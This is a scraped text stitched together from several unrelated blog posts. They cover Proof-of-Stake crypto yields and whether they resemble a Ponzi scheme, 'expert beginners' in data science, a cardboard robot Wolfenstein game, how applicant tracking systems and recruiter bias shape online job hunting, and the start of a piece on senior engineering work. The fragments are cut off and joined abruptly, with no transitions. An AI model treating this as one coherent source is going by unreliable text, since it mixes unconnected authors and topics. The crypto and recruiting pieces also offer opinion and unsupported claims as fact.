<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>

I apply this in assignments and Kaggle and everything works fine—this is the <em>narrow</em> context.</p>

<p>Then, perhaps I get the opportunity to apply my new skills in a <em>wider</em> context—I build a model, validate it (via random train-test split), and deploy it. However, the offline and online (i.e., A/B test) metrics don’t match up. Eventually, I figure out that I should use a <a href="https://www.fast.ai/2017/11/13/validation-sets/" target="_blank">time-based split</a> so future data doesn’t <em>leak</em> into the training set.</p>

<p>With the benefit of the wider context, I encountered challenges and failures (read: lessons) that were not part of the MOOC assignments. As a result, I got to see the bigger picture; I know there’s still lots to learn. Thus, I continue to learn and progress through the stages of beginner, intermediate, and so on.</p>

<blockquote>
  <p>The more I learn, the more I realise how much I don’t know. – Albert Einstein</p>
</blockquote>

<h2 id="from-beginner-to--expert-beginner">From beginner to … expert beginner</h2>

<p>But what happens if I <em>don’t</em> see the bigger picture?</p>

<p>Let’s assume I work in the HR department of a widget manufacturer. Everything—from headcount to payroll to vacation balance—is run in Excel. I apply my newfound <code>R</code> skills to automate my work via one-off scripts. This involves calculating statistics on factory sites and displaying it via a <code>Shiny</code> dashboard on the department desktop. In the eyes of my manager and team, I’m an absolute rockstar ninja wizard. I get showered with praise and am promoted to manager of HR data science.</p>

<p>I might not know about proper ML validation, deployment, unit tests, or even version control. I certainly haven’t done any of that. But who cares? We don’t need it. I’m now the manager of HR data science. I’m now… an “expert”.</p>

<p>To those in the know, I’m clearly still a beginner. But my context is narrow and I don’t see the bigger picture. Thus, I don’t know that there’s still lots to learn, lots to do. However, because I’ve achieved a modicum of success (through <em>narrow</em> applications of what I learned) and others call me an expert, I now view myself as an expert. As a result, I stop learning. I’m now stuck at a local optima. <strong>I’ve become an <a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/" target="_blank">expert beginner</a></strong>.</p>

<p>Suppose I stay in that same role, within HR, for 10 years. At the end of it, do I have 10 years of experience, or one year of experience repeated 10 times?</p>

<details><summary>An army of expert beginners led by an expert beginner</summary>
<div>

<p>As head of HR data science, I hire a team of data scientists. Eventually, some team members will suggest new technology (e.g., Python, Docker) or practices (e.g., version control, unit testing).</p>

<p>However, I’m the most experienced (read: longest tenure) and the expert-est expert. I dismiss ideas and technology that I’m unfamiliar with. “Oh, I see you’re new here. Yes, Python sounds like a good idea but the Chief HR Officer really likes the <code><span>Shiny</span></code> dashboard that I built.” “Haha, we don’t need unit tests! I live and breathe this code every day—there’s no need to test it”.</p>

<p>Team members who can see the bigger picture are disappointed by the outdated technology and incorrect practices. They see no room for learning and growth. As a result, <strong>the most talented and ambitious leave</strong> (if they know what’s best for them). For those who stay—hurray! There’s less competition. They’ll toe the line and one day, they’ll be a <em>senior</em> expert beginner and teach new joiners their “expert” ways.</p>

<p>This leads to the <a href="http://brucefwebster.com/2008/04/11/the-wetware-crisis-the-dead-sea-effect/" target="_blank">Dead Sea effect</a> where you’re <strong>left with your least talented and effective</strong> people. They’re grateful to have a job and settle in for a couple of years (or decades). Now, the team has (d)evolved into an army of expert beginners who follow the directions of the top expert beginner.</p>

<p>Because expert beginners have learned “everything” there is to learn, tried “everything” there is to try, and done “everything” there is to do, there’s nothing new to learn, try, and do. The team stops trying new ideas—“Oh we don’t use Docker here. We have VMs!”—and the organization stops innovating.</p>

<p>This partly explains some industries getting disrupted. The iPhone disrupting Nokias and Blackberrys, AWS disrupting on-premise hardware, Stripe disrupting payment processing, Tesla disrupting… you get the idea.</p>

<p>The expert beginner doesn't see the bigger picture; thus, he is stuck.</p>

<h2 id="the-beginners-mind-is-always-a-student">The beginner’s mind is always a student</h2>

<p>How do we prevent stagnation (and possibly becoming an expert beginner)? How do we stay open-minded and constantly learning and experimenting?</p>

<p><strong>One way is <a href="https://en.wikipedia.org/wiki/Shoshin" target="_blank">Shoshin</a> (beginner’s mind)</strong>. It’s a concept from Zen Buddhism on having an attitude of openness, eagerness, and no preconceptions, even when our knowledge of the subject is advanced. In other words, to think <em>just</em> like a beginner.</p>

<blockquote>
  <p>In the beginner’s mind there are many possibilities, but in the expert’s there are few. – Shunryu Suzuki</p>
</blockquote>

<p>With beginner’s mind, regardless of your experience and expertise, you <strong>stay curious and approach new ideas and experiences as a student</strong>. Even when new technology or methods don’t fit your paradigm, you’re open to learning and trying it. Students don’t say “That’s not how we do things here”.</p>

<p>Sometimes, when others view us as experts, we let it get to us. We stay within our narrow subject matter expertise and stop exploring new ideas and possibilities. We avoid newer, bigger challenges so we don’t make mistakes; we stick to what has worked in the past. This helps preserve our expert identity.</p>

<blockquote>
  <p>The most dangerous phrase in the language is, “We’ve always done it this way.” – Grace Hopper</p>
</blockquote>

<p>But this doesn’t make sense. In my field of data science, new tools (e.g., Spark, Docker, Airflow) and methods (e.g., embeddings, attention, pre-training) constantly improve on the state of the art (SOTA)—it’s useful, if not essential, to keep up to date. (That said, fundamental techniques like regression and decision trees are often a solid baseline.)</p>

<h2 id="the-beginners-mind-keeps-on-pedalling">The beginner’s mind keeps on pedalling</h2>

<p>Learning is like cycling. When we start pedalling (from a standstill), it takes effort and time to gain momentum. Nonetheless, we’ll pick up speed and begin gaining distance.</p>

<p>We might look back at where we started and think “Wow, I’ve come a long way. Perhaps I don’t have to pedal as hard; perhaps I don’t have to pedal at all.” If we stop pedalling, the initial momentum might carry us slightly further, but eventually, we’ll come to a standstill. While we don’t lose the distance covered, we’re not gaining distance either. (Though in fast-paced fields like tech, if you don’t move forward, <em>you begin to move backward</em>.)</p>

<p>Here, distance is knowledge (and achievements); momentum is learning. While distance is correlated with expertise, the relationship is not as strong as we think (e.g., one year of experience repeated 10 times). I think momentum (the ability to learn and adapt quickly) is part of expertise as well. The experts I know are often reading or hacking. At work, they can synthesize their mental prototypes and tailor solutions based on context.</p>

<p>To maintain momentum, <strong>the beginner’s mind continues to pedal regardless of the distance they’ve covered</strong>. It’s not surprising that many successful people are—and continue to be—voracious readers and learners. Warren Buffet, Bill Gates, Elon Musk, just to name a few. Do you know any successful person that doesn’t read or learn?</p>

<blockquote>
  <p>The illiterate of the 21st century will not be those who cannot read and write, but those who cannot learn, unlearn, and relearn. – Alvin Toffler</p>
</blockquote>

<details><summary>Note: Not all knowledge is the same</summary>
<div>

<p>There’s knowledge that we gain from books and courses—we’re tested on this in exams. Then, there’s <a href="https://commoncog.com/blog/the-tacit-knowledge-series/" target="_blank">(tacit) knowledge</a> that we gain from practice—we’re tested on this in life.</p>

<div>

<blockquote><div lang="en" dir="ltr"><p>You cannot get educated by this self-propagating system in which people study to pass exams, and teach others to pass exams, but nobody knows anything.</p><p>You learn something by doing it yourself, by asking questions, by thinking, and by experimenting. 🧠</p></div>— Richard Feynman (@ProfFeynman) <a href="https://twitter.com/ProfFeynman/status/1295411496407556096?ref_src=twsrc%5Etfw">August 17, 2020</a></blockquote>

</div>

<p>For example, learning to ride a bicycle. We can’t learn to ride a bike by reading a textbook. The <strong>only way to learn is by actually doing it</strong>. We’re going to lose balance and fall, but eventually, we’ll figure it out. Also, our ability to ride a bike is <strong>transferable</strong> to other two-wheeled transport. Once we learn how to ride a regular bike, we’ll have a gentler learning curve on mountains bikes, tandem bikes, and even e-scooters.</p>

<p>Similarly, some skills and knowledge <strong>can only be gained through practice</strong>. They’re usually <strong>transferable</strong> across multiple domains too. For example, what’s the most suitable way to <a href="https://bugra.github.io/posts/2020/5/25/how-to-serve-model/" target="_blank">serve models in production</a>? There are some common patterns: compute offline and cache, serve via microservice, embed in the main app. Do these patterns differ across domains? Not much. Which is the best approach for our use case? Well, it depends—knowing the answer is tacit knowledge.</p>



<p>Often, such skills and knowledge are <strong>fundamental</strong> and can be thought of as building blocks (or <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a>). For example, in programming, we learn about conditionals, iteration, and data structures. In distributed data processing, we learn about map, reduce, and shuffle. Once we understand these fundamentals, it’s easier to pick up another programming language or distributed processing framework. It also helps us write more effective software and <a href="https://en.wikipedia.org/wiki/Extract,_transform,_load" target="_blank">ETL</a> jobs.</p>

<p>Mastering the fundamentals also helps with the <a href="https://commoncog.com/blog/to-get-good-go-after-the-metagame/" target="_blank">metagame</a>. The meta (i.e., higher-order factors) changes constantly. For example, <a href="https://eugeneyan.com/writing/nlp-supervised-learning-survey/" target="_blank">natural language processing</a> has evolved rapidly from recurrent models to embeddings to attention to …</p></div></details></div></div>

<h2>Play a first person game with a robot</h2>
<p><img alt="Looping video of a cardboard robot carrying a smartphone with a man's face on it moving from side to side" src="https://cdn.shopify.com/s/files/1/1041/4014/files/Wiggle1_1024x1024.gif?v=1598350839"></p>
<p>We've created a new expansion for <a href="https://thecraftyrobot.net/" title="Meet Smartibot">Smaribot</a> that allows you to build a telepresence robot that works with your phone. It's called <a href="https://www.kickstarter.com/projects/rossatkin/smartipresence-cardboard-telepresence-robot" target="_blank" title="Smartipresence on Kickstarter" rel="noopener noreferrer">Smartipresence</a> and&nbsp;to make it all work slickly&nbsp;we've built a telepresence system.</p>
<p><img alt="Looping video. First section shows a cardboard robot carrying a smartphone driving towards a small child. Second section shows the robot's point of view with buttons at the side moving it." src="https://cdn.shopify.com/s/files/1/1041/4014/files/ChasingChild5_1024x1024.gif?v=1598350981"></p>
<p>Driving the robot around from somewhere else feels a bit like playing a first person game and made me wonder what it would be like to build an actual game around it.</p>
<p>It felt appropriate to&nbsp;go back to the&nbsp;origin of the first person shooter genre and do Wolfenstein 3D. I think many of us miss the chunky pixels and moral clarity that Nazis are bad.&nbsp;</p>
<h2>Cardboard computer game</h2>
<p><img alt="Loping video of a small robot punching a cardboard Nazi in a cardboard labrynth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchGif2_1024x1024.gif?v=1598351095"></p>
<p>Because&nbsp;Wolfenstein 3D had 2D sprites (enemy characters) in a 3D world I thought it would probably transfer to cardboard quite nicely. I wanted to build it all on a table which limited space a bit, meaning I wasn't going to build a robot that could shoot (probably a good decision anyway) so I settled on a compact cardboard labyrinth and a robot that could punch.</p>
<h2>Punching robot</h2>
<p><img alt="Looping video of a close up of a cardboard fist punching a cardboard Nazi" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchCloseUp1_1024x1024.gif?v=1598351227"></p>
<p>I used to live&nbsp;around the corner from&nbsp;the <a href="https://www.theguardian.com/artanddesign/2016/sep/25/the-full-history-of-the-cable-street-mural">Cable Street mural</a>,&nbsp;which&nbsp;is a great argument for punching Nazis, so this seemed good. I&nbsp;designed a compact 3D printed Smartibot chassis that could hold a smartphone and a 9g servo to operate the punch mechanism, to which I attached a nice pixelated fist. (files on Thingiverse).</p>
<h2>A game engine on your table</h2>
<p>I got a friend who's worked for many years creating computer games&nbsp;to test this out and she said "you've made a game engine", which wasn't really something I'd considered before but it makes sense.</p>
<p>Game engines (software frameworks that handle things like in-game physics and graphics) have allowed games producers to focus on the creative aspects of game making and opened up the field to many less technical people.</p>
<p>Using a small telepresence robot (like Smartipresence) in this way&nbsp;makes game creation even easier, all you need is a table (or bit of floor) to build your environment on, some things for the player to interact with and a clear idea of how the game mechanics should work. The physical world provides your physics and graphics engine and your hands handle the game mechanics.</p>
<p>I think this could be a <strong>really fun</strong> way for kids to interact with their loved ones remotely.</p>
<p><img alt="Looping video of a small purple circuit board with a smiling face on it connected to 14 motors all of which are moving back and fourth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/AllTheMotors_1024x1024.gif?v=1598352223"></p>
<p>The robot I&nbsp;built to play Smartistein3D uses only three motors (the two that come in the Smartibot kit to drive the wheels and move it around plus the little servo for the punch) but because Smartibot is so flexible (and can control up to 14 motors) you could build more complicated robots for more complicated game mechanics (you could use almost any of the robots in the projects section as the character). Plus, if you've got&nbsp;strong enough internet, there's no reason not to have multiple players controlling multiple robots. ALSO, you could probably use <a href="https://thecraftyrobot.net/blogs/projects/simple-programming-with-the-a-i-getting-your-smartibot-to-run-away-from-people-but-still-chase-other-things" title="Smartibot A.I. programming">Smartibot's A.I.</a> mode to create enemies that move around and respond to the player characters automatically ... I&nbsp;doubt&nbsp;this&nbsp;will the last game I'll make with Smartipresence.</p>

<p>Whether you’re lucky enough to be employed or currently out of work, it’s no secret that <strong>landing a job in 2020 is harder than ever before.</strong></p>
<p><span>And while it’s easy to blame coronavirus and wallow in our job-seeker sorrow—and believe me, I’m not ignoring the very real challenges of our current economy—my research suggests there’s more to it than that.</span></p>
<p><span>A friend of mine had been applying to jobs prior to the pandemic, and he hadn’t landed a single interview.&nbsp;</span></p>
<p><span>I thought I’d have the solution to his problem in all of five minutes (I used to be </span>p<span>retty good at applying for jobs online</span><span>), but it turns out he was already doing everything </span><i><span>“right.”</span></i><span>&nbsp;</span></p>
<p><span>His resume listed quantified bullet point after quantified bullet point. The formatting looked good. He tailored his cover letters to the position descriptions. His online presence is superb; he owns the front page of Google results for his name. And LinkedIn rated his profile as an “All-Star.” Oh yeah, he’s also gainfully employed.</span></p>
<p><span>You might be thinking, “Well, if he applied through job boards, that’s his first problem.”&nbsp;</span></p>
<p><span>And I’m thinking, “He used to apply through job boards and land interviews more than 60 percent of the time just a few years ago, so what’s changed?”&nbsp;</span></p>
<p><span>Turns out, A LOT. And I would’ve never known if it wasn’t for my friend stumping me with his seemingly simple quandary. I’m flabbergasted by how out of touch I was with the modern job hunt, which is why I couldn’t </span><b>not</b><span> write this post.&nbsp;</span></p>
<p><strong>With the average job tenure lasting just one year on average, it’s extremely likely you’ll need to understand <i>why</i> in the near future.&nbsp;</strong></p>
<p><span>I wrote this post to demystify the modern recruiting process and help qualified candidates figure out how to apply for jobs online. So if you’re ready to make it past the initial resume screening process and score an interview—and ultimately land the opportunity you deserve—then keep reading.</span></p>

<p><span>TLDR: ATS help recruiters/hiring managers collect, sort, and organize a large number of applications.&nbsp;</span></p>

<h4><span>Most Common ATS Features</span></h4>
<p><span>Rather than manually reviewing each resume, recruiters and hiring managers search for resumes based on keywords, or have the system filter or automatically rank applicants.&nbsp;</span></p>
<p><span>In many cases, recruiters use the technology to do a first pass of resumes, meaning you can be removed from consideration </span><b>by an algorithm without ever being reviewed by a human</b><span>.&nbsp;</span></p>
<p><span><img title="how to apply for jobs online what happens to your resume ats 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png" alt="Infographic: What happens to your resume in an applicant tracking system" width="2501" height="10553" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02.png 2501w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-71x300.png 71w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-243x1024.png 243w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-768x3241.png 768w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-what-happens-to-your-resume-ats-02-364x1536.png 364w" sizes="(max-width: 2501px) 100vw, 2501px">While there </span><a href="https://blog.ongig.com/applicant-tracking-system/top-ats-systems-used-by-the-fortune-500-2019"><span>hundreds of ATS on the market</span></a><span>, most of them list the same features. Understanding them is key to landing an interview. Here are the big ones that will determine whether a human ever sees your resume.</span></p>

<h5><span>Automatic Applicant Ranking/Scoring</span></h5>
<p><span>Many ATS provide an automatic “match rank” or score for each applicant.&nbsp;</span><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg" alt="candidate match score example on Job Score website" width="982" height="400" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring.jpg 982w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-300x122.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-768x313.jpg 768w" sizes="(max-width: 982px) 100vw, 982px"></a>The system will take and parse the information from your resume, and compare it with the job description, looking for specific keywords, then provide a score from 0 to 100, or one to 10, that tells recruiters how qualified a candidate is for said job, based on the criteria set by the hiring manager.&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg" alt="ATS extracts contact info, employment and education history from resumes" width="1000" height="420" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-300x126.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-02-768x323.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>They’ll also score you based on the answers you submit via the online form, aka “knockout questions.”&nbsp;</span></p>
<p><span><a href="https://www.jobscore.com/features/submit-resume/"><img title="how to apply for jobs online ats ranking scoring 03" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg" alt="Job Score website, qualifying questions" width="1000" height="763" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-300x229.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-ranking-scoring-03-768x586.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></span></p>
<p><span>For example, job posts that ask for your location are likely using that information as a filter that will alter your overall qualification score.&nbsp;</span></p>

<h5><span>Comprehensive Candidate Profiles</span></h5>
<p><span>Many ATS will automatically create a comprehensive, wildly detailed profile of you based on your digital footprint and other “public” information. All they need is your email address to populate every piece of available content about you online.&nbsp;</span></p>
<p><span>According to </span><a href="https://resources.workable.com/tutorial/important-applicant-tracking-system-features"><span>Workable</span></a><span>, aggregating candidates’ public information is a way to “humanize” the process, and they list it as a must-have feature for today’s ATS. Here’s how they describe it:</span></p>
<p><i><span>“I want to see faces dammit. And tweets. And maybe other stuff that humanizes this record.”</span></i></p>
<p><span>(In my opinion, that’s just a recipe for complete and total bias, as we know </span><a href="https://www.crowdstaffing.com/blog/hidden-bias-that-affect-the-hiring-process"><span>there’s A LOT of it in recruiting</span></a><span>, even if it’s subconscious.)&nbsp;</span></p>
<p><span>Many <a href="https://www.entelo.com/products/platform/search/">recruitment tools</a> even go so far as to make predictions about candidates based on the information they surface about them online.&nbsp;</span></p>
<p><a href="https://www.entelo.com/products/platform/search/"><span><img title="how to apply for jobs online ats candidate profiles" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png" alt="Profile of senior product designer at Acme and predictions about his performance, fit, and longevity." width="1010" height="958" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles.png 1010w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-300x285.png 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-ats-candidate-profiles-768x728.png 768w" sizes="(max-width: 1010px) 100vw, 1010px"></span></a></p>
<p><span>In </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>one of the first posts I read by a recruiter</span></a><span> on this topic, she tells hiring managers to search data enrichment tools/databases, like Pipl, Jigsaw and Zoominfo.&nbsp;</span></p>
<p><span>Pipl’s main use case is for “investigations.”&nbsp;</span></p>
<p><i><span>“</span></i><a href="https://pipl.com/investigation-and-research"><i><span>Pipl’s identity resolution engine</span></i></a><i><span> cross-references global data from the Internet, public records, listings, directories, archives and exclusive sources to show the connections between people and the world.”</span></i></p>
<p><span>ZoomInfo is more for B2B data enrichment. Check out the screenshot below to see how they collect your information.&nbsp;</span></p>
<p><span><a href="https://www.zoominfo.com/business/our-data?utm_campaign=branded"><img title="how to apply for jobs online candidate profiles zoominfo 02" src="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg" alt="ZoomInfo" width="1000" height="899" srcset="https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02.jpg 1000w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-300x270.jpg 300w, https://www.thevectorimpact.com/wp-content/uploads/2020/07/how-to-apply-for-jobs-online-candidate-profiles-zoominfo-02-768x690.jpg 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a>Pretty scary, huh?&nbsp;</span></p>

<h5><span>Resume Parsing</span></h5>
<p><span>This is sort-of a feature of the “Automatic Applicant Ranking/Score” section, but it’s also important to mention on its own.&nbsp;</span></p>
<p><span>Resume parsing refers to how ATS extracts and organizes your resume into “structured data,” so they can do stuff like rank/score you automatically.&nbsp;</span></p>
<p><span>This means that many times submitting a PDF, or using creative typography, will hurt you, because the ATS can’t read the data well, if at all.&nbsp;</span></p>

<h5><span>Resume Storage</span></h5>
<p><span>Even if you’re rejected for a position, the ATS will store your resume in its system, because every time there’s a new role to fill, they’ll start with searching their databases to see who might be a match, which leads me to the next feature.&nbsp;</span></p>

<h5><span>Search and Filters</span></h5>
<p><span>ATS allows hiring managers to search by any keyword, and often with </span><a href="https://recruitingtools.com/boolean-strings-network/"><span>Boolean search</span></a><span>, which connects keywords using AND, OR, NOT and NEAR.</span></p>
<p><span>Some tools will even let you filter by those it labels “not job hoppers,” etc.&nbsp;</span></p>
<p><span>Filters may include the job seeker’s location, application source, age of your profile, and whether or not you’re an employee referral.&nbsp;</span></p>

<h4><span>Recruiters’ dirty little secrets&nbsp;</span></h4>
<h5><span>Backchanneling / Backdoor references</span></h5>
<p><span>If the recruiter actually sees your resume and is interested in interviewing you, she’ll likely visit your LinkedIn profile to make sure everything checks out.&nbsp;</span></p>
<p><span>She may even message any mutual connections you have to see what they’ll say about you. This is illegal but it happens all the time from </span><a href="https://www.glassdoor.com/blog/8-secrets-recruiters-wont-tell-you/"><span>what I read</span></a><span>.</span></p>
<p><i><span>“This phenomenon is even more prevalent in the last five years or so because of LinkedIn’s growing popularity. Even if you choose not to give anybody there as a reference, backdoor references can reveal the skeletons in your closet. Backdoor references can be especially common when you’re looking for a job in sectors like tech.”</span></i></p>

<h5><span>Cyberstalking</span></h5>
<p><span>Another potentially discriminatory and sometimes illegal practice includes cyberstalking you.&nbsp;</span></p>
<p><i><span>“A lot of recruiters—most that I know—will Google candidates who make it pretty far [in the hiring process], and then use Google image results, and also blog posts, tweets, and open Facebook accounts to judge someone’s character and credibility.” (</span></i><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><i><span>Source</span></i></a><i><span>)</span></i></p>

<h5><span>[Subconscious] Bias</span></h5>
<p><span>Whether it’s subconscious or downright discriminatory, hiring managers usually have a </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>preconceived picture</span></a><span> of what the perfect candidate looks like, which often is based on stereotypes.</span></p>

<p><b>Bias 1: Being overweight</b></p>
<p><span>Weight bias is still especially prevalent, according to one recruiter, who says being overweight can make people think the person is lazy or lacks motivation.</span></p>

<p><b>Bias 2: “Diversity”</b></p>
<p><span>“Diversity in Silicon Valley’s mind is the picture of Phylicia Rashad,” (the actress who portrayed Clair Huxtable on The Cosby Show), said another recruiter </span><a href="https://www.fastcompany.com/40441093/former-recruiters-reveal-the-industrys-dark-secrets-that-cost-you-job-offers"><span>via the same article</span></a><span>.&nbsp;</span></p>
<p><span>According to the post, she sees African-American women considered more readily for roles as diversity/inclusion chiefs, while white men more often lead the pack to head up sales teams.</span></p>
<p><span>Another recruiter bolsters her experience:&nbsp;</span></p>
<p><i><span>“There’s a penchant to see more diversity, but the definition is narrow,” typically reduced to race and gender; it was common to tout a candidate for being a “visible minority.” “It’s the only way to highlight that for the client on a call,” he explains, since “we can’t put it in our documentation.”</span></i></p>

<p><b>Bias 3: Looking “too young”&nbsp;&nbsp;</b></p>
<p><span>The same recruiter from above said he also sees a lot of ageism in the hiring process.&nbsp;</span></p>
<p><span>For example, there’s kind-of a sweet spot in terms of age for C-level positions, he said.&nbsp;</span></p>
<p><span>“My boss would say things like, ‘Did they have enough gray hair?’—not literally, but are they seasoned enough, do they have enough experience where they could be credible?”&nbsp;</span></p>
<p><span>There were occasions when recruiters would nominate younger, well-qualified candidates for senior leadership roles, Mark recalls, but “I’d say 20% of the time they’re open to meeting with that person.”</span></p>

<p><b>Bias 4: Expensive degrees</b></p>
<p><span>At the beginning of the recruitment process, recruiters are dealing with so many resumes that they use a prestigious degree as a quick way to filter down the candidate pool.&nbsp;</span></p>
<p><span>According to a recruiter from that FastCompany article I mentioned …</span></p></span></section></article></div></div>

					<h4 id="my-experiences-working-at-google-microsoft"><em>My experiences working at Google &amp; Microsoft</em></h4><p>When I started working at Microsoft, fresh out of college, coding was my life. Writing code was the easiest way to build any cool thing that my brain could imagine. &nbsp;When I thought about what I’d want to do for the rest of my life I thought that I just wanted to keep coding. </p><p>During the next 11 years I became a Senior Engineer at Microsoft and moved on to work at Google and later Stripe. At these higher levels I still get to build, but I use a very different set of tools to do it. There’s a huge mindset shift needed when you go from junior to senior. Writing code becomes a minor part of the job. </p><p>Ever built a tool no one used? I have. It sucked. At the senior levels most of your time goes into identifying <strong>what </strong>needs to be built and <strong>how </strong>to build it. You have to research what the problem looks like. You talk to others and get everyone to agree on what needs to be done. </p><p>These are your new tools:</p><ul><li>Research the problem</li><li>Design the solution</li><li>Build consensus</li></ul><h2 id="research-like-a-detective">Research like a Detective</h2><p>Fresh out of college you get handed tasks where the right answer is pretty straightforward. There isn’t much disagreement on what to do other than the occasional feedback in code reviews.</p><p>As you get more experienced your problems become more ambiguous. The path looks hazy. There are multiple routes you could take, but each one hides its own dragons. It’s not about coding anymore. Most of your work goes into research, and you can’t google the answer.</p><p>Research can take many forms. It usually involves a combination of reading code, reading documentation, and talking to people. Yes, actual human beings. In fact, that’s where 